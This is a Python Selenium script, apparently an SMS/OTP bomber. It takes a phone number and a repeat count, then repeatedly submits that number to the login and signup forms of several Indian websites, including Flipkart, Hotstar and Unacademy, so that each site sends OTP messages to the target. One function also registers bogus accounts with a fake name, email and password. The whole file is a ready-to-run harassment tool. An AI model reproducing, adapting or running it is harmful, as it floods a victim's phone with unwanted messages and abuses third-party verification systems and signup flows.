#/usr/bin/python3.8
# For windows
import sys

try:
    import selenium
except:
    print("[-] selenium module Not Found!\nRun 'pip install selenium'")
    sys.exit()

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

i = int(input("How Many Times u have to send [per site]: "))
num = str(input("Enter the Phone Number [no need to specify '+91']: "))
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")

#change "chromedriver" path to full path if not work
#eg1 - "E:\\file_name\\File\\chromedriver"  <++ IN WINDOWS
#eg2 - "/home/linux/Desktop/test/chromedriver" <++ IN LINUX


browser = webdriver.Chrome("chromedriver",chrome_options=chrome_options) 


def main(browser):
    browser.maximize_window()
    browser.implicitly_wait(2)
    #\list\ to\ attack\
    coolwings(browser)
    flipkart(browser)
    goMechenic(browser)
    winZoGames(browser)
    #confirmTkl(browser)
    unacadmey(browser)
    hotStar(browser)
    openBank(browser)
    sureBulls(browser)
    browser.close()
    


def coolwings(browser):
    #for number in numbers:
        count = 0
        while (count<i):
            browser.get('https://www.coolwinks.com/')
            browser.implicitly_wait(3)
            browser.find_element_by_xpath('//*[@id="newSignin"]').click()
            browser.implicitly_wait(2)
            browser.find_element_by_xpath('//*[@id="userinput"]').send_keys(num)
            browser.implicitly_wait(2)
            browser.find_element_by_xpath('//*[@id="logreg-forms"]/form[1]/button').click()
            count += 1
            browser.implicitly_wait(2) 

def flipkart(browser):
    count = 0
    while (count<i):
        browser.get("https://www.flipkart.com/account/login?ret=/")
        browser.implicitly_wait(2)
        browser.find_element_by_xpath('/html/body/div/div/div[3]/div/div[2]/div/form/div[1]/input').send_keys(num)
        browser.implicitly_wait(1)
        browser.find_element_by_xpath('/html/body/div/div/div[3]/div/div[2]/div/form/div[5]/button').click()
        time.sleep(3)
        count += 1
def goMechenic(browser):
    count = 0
    while (count<i):
        browser.get("https://gomechanic.in/kanpur")
        browser.implicitly_wait(2)
        browser.find_element_by_xpath('//*[@id="app"]/div[2]/div[1]/div[2]/div/div/div[2]/div[4]').click()
        browser.find_element_by_xpath('/html/body/div[2]/div[2]/div[1]/div[2]/div/div[2]/div[2]/form/div/div/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[2]/div[2]/div[1]/div[2]/div/div[2]/div[2]/div/div').click()
        time.sleep(3)
        count += 1

def winZoGames(browser):
    count = 0
    while (count<i):
        browser.get("https://www.winzogames.com/")
        browser.implicitly_wait(1)
        browser.find_element_by_xpath('/html/body/div/main/div[1]/div/div/div/div/div[2]/div[1]/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div/main/div[1]/div/div/div/div/div[2]/button').click()
        time.sleep(2)
        count += 1

def confirmTkl(browser):
    count = 0
    while (count<i):
        browser.get('https://www.confirmtkt.com/rbooking-d/wallet')
        browser.implicitly_wait(1)
        browser.find_element_by_xpath('/html/body/div[2]/div[3]/div/div/div/div/div[3]/div/div/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[2]/div[3]/div/div/div/div/div[3]/button/span[1]').click()
        time.sleep(2)
        count += 1
def unacadmey(browser):
    count = 0
    while (count < i):
        browser.get('https://unacademy.com/')
        browser.implicitly_wait(2)
        browser.find_element_by_xpath('/html/body/div/header/div/button').click()
        browser.find_element_by_xpath('//*[@id="DrawerPaper"]/div[2]/div[2]/div/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[2]/div[3]/div[2]/div[3]/button').click()
        count+=1

def hotStar(browser):
    count = 0
    while (count<i):
        browser.get('https://www.hotstar.com/in/subscribe/select-plan')
        browser.implicitly_wait(5)
        browser.find_element_by_xpath('/html/body/div[1]/div[2]/div[4]/div[1]/div[3]/div[3]/div/div[3]/div[2]').click()
        browser.implicitly_wait(1)
        browser.find_element_by_xpath('/html/body/div[1]/div[2]/div[4]/div[1]/div[3]/div[3]/div[2]/div/div/div[4]/div/div/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[1]/div[2]/div[4]/div[1]/div[3]/div[3]/div[2]/div/div/div[4]/button').click()
        count+=1

def openBank(browser):
    count = 0
    while (count<i):
        browser.get('https://app.open.money/register')
        browser.implicitly_wait(2)
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/mat-form-field[1]/div/div[1]/div/input').send_keys("funk up")
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/mat-form-field[2]/div/div[1]/div/input').send_keys("testCar@gmail.com")
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/mat-form-field[3]/div/div[1]/div/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/mat-form-field[4]/div/div[1]/div/input').send_keys("hellomotoAS#@71")
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/div[1]/mat-checkbox/label/span[1]/input').click()
        browser.find_element_by_xpath('/html/body/app-root/app-register/div/div/div[2]/mat-card/div[2]/div[4]/form/div[3]/button').click()
        browser.implicitly_wait(1)
        count+=1
def sureBulls(browser):
    count = 0
    while (count<i):
        browser.get('https://surebulls.com/')
        browser.implicitly_wait(2)
        browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div/div[2]/form/input[2]').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div/div[3]/select').click()
        browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div/div[3]/select/option[5]').click()
        browser.find_element_by_xpath('/html/body/div[4]/div/div/div/div/div[4]/button').click()
        browser.implicitly_wait(1)
        count+=1

main(browser)
